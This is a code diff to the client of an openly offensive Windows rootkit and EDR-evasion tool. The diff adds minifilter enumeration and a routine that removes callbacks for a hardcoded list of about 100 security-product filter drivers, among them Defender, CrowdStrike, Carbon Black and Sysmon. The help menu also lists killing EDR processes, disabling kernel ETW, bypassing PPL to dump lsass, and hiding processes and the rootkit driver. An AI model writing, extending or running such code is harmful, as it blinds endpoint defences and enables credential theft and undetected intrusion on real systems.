@@ -50,12 +50,8 @@ struct threadArgs {
 #define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
 #define IOCTL_WIN_ETW_DISABLE CTL_CODE_HIDE(17)
 #define IOCTL_LIST_OBJ_CALLBACKS CTL_CODE_HIDE(18)
-
-
-
-
-
-
+#define IOCTL_LIST_MINIFILTERS CTL_CODE_HIDE(19)
+#define IOCTL_REM_MINIFILTER_CALLBACK CTL_CODE_HIDE(20)
 
 
 #pragma warning (disable: 4996)
@@ -74,6 +70,10 @@ struct ModulesData {
     ULONG64 ModuleBase;
 };
 
+typedef struct _MinifilterData {
+    WCHAR FilterName[256];
+    WCHAR FilterAltitude[256];
+} MinifilterData, * PMinifilterData;
 
 struct pplData {
     DWORD pid;
@@ -151,6 +151,33 @@ const char* monitoredDrivers[] = {
     "cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
 	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
 };
+
+const wchar_t* monitoredMinifilters[] = {
+    L"EX64", L"Eng64", L"teefer2", L"teefer3", L"srtsp64",
+    L"srtspx64", L"srtspl64", L"Ironx64", L"fekern", L"cbk7",
+    L"WdFilter", L"cbstream", L"atrsdfw", L"avgtpx86",
+    L"avgtpx64", L"naswSP", L"edrsensor", L"CarbonBlackK",
+    L"parity", L"csacentr", L"csaenh", L"csareg", L"csascr",
+    L"csaav", L"csaam", L"rvsavd", L"cfrmd", L"cmdccav",
+    L"cmdguard", L"CmdMnEfs", L"MyDLPMF", L"im", L"csagent",
+    L"CybKernelTracker", L"CRExecPrev", L"CyOptics", L"CyProtectDrv32",
+    L"CyProtectDrv64", L"groundling32", L"groundling64", L"esensor",
+    L"edevmon", L"ehdrv", L"FeKern", L"WFP_MRT", L"xfsgk",
+    L"fsatp", L"fshs", L"HexisFSMonitor", L"klifks", L"klifaa",
+    L"Klifsm", L"mbamwatchdog", L"mfeaskm", L"mfencfilter",
+    L"PSINPROC", L"PSINFILE", L"amfsm", L"amm8660", L"amm6460",
+    L"eaw", L"SAFE-Agent", L"SentinelMonitor", L"SAVOnAccess",
+    L"savonaccess", L"sld", L"pgpwdefs", L"GEProtection",
+    L"diflt", L"sysMon", L"ssrfsf", L"emxdrv2", L"reghook",
+    L"spbbcdrv", L"bhdrvx86", L"bhdrvx64", L"symevent", L"vxfsrep",
+    L"VirtFile", L"SymAFR", L"symefasi", L"symefa", L"symefa64",
+    L"SymHsm", L"evmf", L"GEFCMP", L"VFSEnc", L"pgpfs",
+    L"fencry", L"symrg", L"ndgdmk", L"ssfmonm", L"SISIPSFileFilter",
+    L"cyverak", L"cyvrfsfd", L"cyvrmtgn", L"tdevflt", L"tedrdrv",
+    L"tedrpers", L"telam", L"cyvrlpc", L"MpKslf8d86dba", L"mssecflt",
+    L"SysmonDrv", L"MsSecFlt"
+};
+
 
 typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 
@@ -796,6 +823,53 @@ BOOL ListObjCallbacks(HANDLE hDevice) {
     return result;
 }
 
+BOOL ListMfDrv(HANDLE hDevice) {
+    DWORD bytesReturned = 0;
+    DWORD64 attempt = 0;
+    DWORD64 neededCount = 0;
+
+    BOOL ok = DeviceIoControl(
+        hDevice, IOCTL_LIST_MINIFILTERS,
+        &attempt, sizeof(attempt),
+        &neededCount, sizeof(neededCount),
+        &bytesReturned, NULL);
+
+    if (!ok || bytesReturned != sizeof(neededCount)) {
+        fprintf(stderr, "First call failed (bytes=%lu, err=%lu)\n", bytesReturned, GetLastError());
+        return FALSE;
+    }
+
+    printf("Numero di mini-filter drivers: %llu\n", (unsigned long long)neededCount);
+
+    if (neededCount == 0) return TRUE;
+
+    size_t allocCount = (size_t)neededCount;
+    MinifilterData* mfData = (MinifilterData*)malloc(sizeof(MinifilterData) * allocCount);
+    if (!mfData) { fprintf(stderr, "malloc failed\n"); return FALSE; }
+
+    attempt = 1;
+    bytesReturned = 0;
+    ok = DeviceIoControl(
+        hDevice, IOCTL_LIST_MINIFILTERS,
+        &attempt, sizeof(attempt),
+        mfData, (DWORD)(sizeof(MinifilterData) * allocCount),
+        &bytesReturned, NULL);
+
+    if (!ok) {
+        fprintf(stderr, "Second call failed (bytes=%lu, err=%lu)\n", bytesReturned, GetLastError());
+        free(mfData);
+        return FALSE;
+    }
+
+    size_t got = bytesReturned / sizeof(MinifilterData);
+    for (size_t i = 0; i < got; i++) {
+        wprintf(L"Modulo %zu: %ls  %ls\n", i, mfData[i].FilterName, mfData[i].FilterAltitude);
+    }
+
+    free(mfData);
+    return TRUE;
+}
+
 BOOL ElLoadImageCallback(HANDLE hDevice) {
     DWORD bytesReturned;
     ModulesData* resultArray = NULL;
@@ -983,6 +1057,72 @@ BOOL ElObjCallBack(HANDLE hDevice) {
     }
 
     return result;
+}
+
+BOOL ElMfCallbacks(HANDLE hDevice) {
+    DWORD bytesReturned = 0;
+    DWORD64 attempt = 0;
+    DWORD64 neededCount = 0;
+    BOOL result;
+    BOOL ok = DeviceIoControl(
+        hDevice, IOCTL_LIST_MINIFILTERS,
+        &attempt, sizeof(attempt),
+        &neededCount, sizeof(neededCount),
+        &bytesReturned, NULL);
+
+    if (!ok || bytesReturned != sizeof(neededCount)) {
+        fprintf(stderr, "First call failed (bytes=%lu, err=%lu)\n", bytesReturned, GetLastError());
+        return FALSE;
+    }
+
+    printf("Numero di mini-filter drivers: %llu\n", (unsigned long long)neededCount);
+
+    if (neededCount == 0) return TRUE;
+
+    size_t allocCount = (size_t)neededCount;
+    MinifilterData* mfData = (MinifilterData*)malloc(sizeof(MinifilterData) * allocCount);
+    if (!mfData) { fprintf(stderr, "malloc failed\n"); return FALSE; }
+
+    attempt = 1;
+    bytesReturned = 0;
+    ok = DeviceIoControl(
+        hDevice, IOCTL_LIST_MINIFILTERS,
+        &attempt, sizeof(attempt),
+        mfData, (DWORD)(sizeof(MinifilterData) * allocCount),
+        &bytesReturned, NULL);
+
+    if (!ok) {
+        fprintf(stderr, "Second call failed (bytes=%lu, err=%lu)\n", bytesReturned, GetLastError());
+        free(mfData);
+        return FALSE;
+    }
+
+    size_t got = bytesReturned / sizeof(MinifilterData);
+    for (size_t i = 0; i < got; i++) {
+        wprintf(L"Modulo %zu: %ls  %ls\n", i, mfData[i].FilterName, mfData[i].FilterAltitude);
+    }
+    
+    for (size_t i = 0; i < got; i++) {
+        for (size_t x = 0; x < 105; x++) {
+            if (wcscmp(monitoredMinifilters[x], mfData[i].FilterName) == 0) {
+
+                wprintf(L"Eliminating callback for %ls \n", monitoredMinifilters[x]);
+                result = DeviceIoControl(
+                    hDevice,
+                    IOCTL_REM_MINIFILTER_CALLBACK,
+                    &mfData[i].FilterName,
+                    sizeof(mfData[i].FilterName),
+                    NULL,
+                    0,
+                    &bytesReturned,
+                    NULL
+                );
+            }
+        }
+    }
+
+    free(mfData);
+    return TRUE;
 }
 
 BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
@@ -1286,6 +1426,9 @@ int main(int argc, char* argv[])
         else if (strncmp(input, "listobj", 7) == 0) {
             ListObjCallbacks(hDevice);
         }
+        else if (strncmp(input, "listmf", 6) == 0) {
+            ListMfDrv(hDevice);
+        }
         else if (strncmp(input, "elproccallback", 14) == 0) {
             BOOL result = ElProcCallback(hDevice);
             if (result) {
@@ -1324,6 +1467,15 @@ int main(int argc, char* argv[])
 		}
         else if (strncmp(input, "elobjcallback", 13) == 0) {
             BOOL result = ElObjCallBack(hDevice);
+            if (result) {
+                printf("Sent request to eliminate object notify routine callback.\n");
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+        }
+        else if (strncmp(input, "elmfcallback", 12) == 0) {
+            BOOL result = ElMfCallbacks(hDevice);
             if (result) {
                 printf("Sent request to eliminate object notify routine callback.\n");
             }
@@ -1443,30 +1595,33 @@ int main(int argc, char* argv[])
 			printf(" - unmap <PID>          - Unmap a specific process by PID\n\n");
 
 			printf(" - stopterm             - Stop killing EDR processes\n");
-			printf(" - stopcrash			- Stop crashing EDR processes\n\n");
+			printf(" - stopcrash            - Stop crashing EDR processes\n\n");
             printf(" - listproc             - List process notify routines\n");
             printf(" - listthread           - List thread notify routines\n");
 			printf(" - listloadimage        - List load image notify routines\n");
 			printf(" - listreg              - List registry notify routines \n");
             printf(" - listobj              - List objects notify routines \n");
+            printf(" - listmf               - List Minifilter drivers (only KMDebug)\n\n");
+
 			printf(" - elproccallback       - Eliminate process notify routine callback\n");
 			printf(" - elthreadcallback     - Eliminate thread notify routine callback\n");
 			printf(" - elloadimagecallback  - Eliminate load image notify routine callback\n");
 			printf(" - elregcallback        - Eliminate registry notify routine callback\n");
 			printf(" - elobjcallback        - Eliminate object notify routine callback\n");
+            printf(" - elmfcallback         - Eliminate MiniFilter notify callbacks\n");
 
 			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     
 
-            printf(" - disKerETW               - disable ETW kernel provider\n");
+            printf(" - disKerETW            - disable ETW kernel provider\n");
 
 			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
-            printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe (run terminate before otherwise dumping is detected)\n\n");
+            printf(" - bypassppllsass       - Bypass PPL for lsass.exe (run terminate before otherwise dumping is detected)\n\n");
 
 			printf(" - elevatelocal <PID>   - Elevate a specific process by PID using local system\n");
 			printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");
 
 			printf(" - hideproc <PID>       - Hide a specific process by PID\n");
-			printf(" - hiderootkitdrv	    - Hide the rootkit driver\n\n");
+			printf(" - hiderootkitdrv       - Hide the rootkit driver\n\n");
 
 			printf(" - help                 - Show this help menu\n");
             printf(" - exit                 - Exit the program\n");
